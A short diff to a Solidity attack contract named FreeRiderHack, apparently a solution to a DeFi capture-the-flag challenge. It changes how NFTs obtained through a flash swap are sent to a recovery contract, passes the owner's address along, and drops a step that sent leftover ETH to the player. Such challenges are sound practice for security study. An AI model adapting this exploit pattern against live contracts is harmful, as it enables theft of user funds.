@@ -75,7 +75,12 @@ contract FreeRiderHack is ERC721Holder {
 
         //send all nfts to reward contract
         for (uint i = 0; i < tokenCount; i++) {
-            nft.safeTransferFrom(address(this), recoveryContract, tokens[i]);
+            nft.safeTransferFrom(
+                address(this),
+                recoveryContract,
+                tokens[i],
+                abi.encode(owner)
+            );
         }
 
         // approx 0.3% fee, +1 to round up
@@ -87,9 +92,6 @@ contract FreeRiderHack is ERC721Holder {
 
         // Repay
         weth.transfer(address(pair), amountToRepay);
-
-        //send all remaining eth to player
-        SafeTransferLib.safeTransferETH(owner, address(this).balance);
     }
 
     receive() external payable {}
